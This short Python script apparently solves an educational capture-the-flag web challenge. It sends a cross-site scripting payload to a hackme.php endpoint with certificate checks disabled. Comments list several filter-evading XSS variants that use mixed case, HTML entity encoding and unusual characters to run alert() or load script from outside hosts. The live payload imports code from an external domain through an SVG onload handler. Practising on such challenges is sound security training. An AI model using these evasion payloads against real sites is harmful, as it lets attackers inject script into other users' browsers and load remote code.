import requests
from urllib3.exceptions import InsecureRequestWarning

# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/77.0.3865.90 HeadlessChrome/77.0.3865.90 Safari/537.36

# <SVG oNLOAD=alert(1)>
# <SVG oNLOAD=alert(&#39;X')>
# <SVG oNLOAD=imp&#x6F;rt(&#39;X')>
# <SCRIPT src=h&#74;tp:ⓔXp.com>
# <SCRIPT src=/\KUANG0.ME%0a>

payload = '''<SVG oNLOAD=import(&#39;XXX.ME')>'''

req = requests.get(
    'https://edu-ctf.kaibro.tw:30678/hackme.php',
    params={'q': payload},
    verify=False)


print(req.content.split(b'<hr>\n', 1)[1])
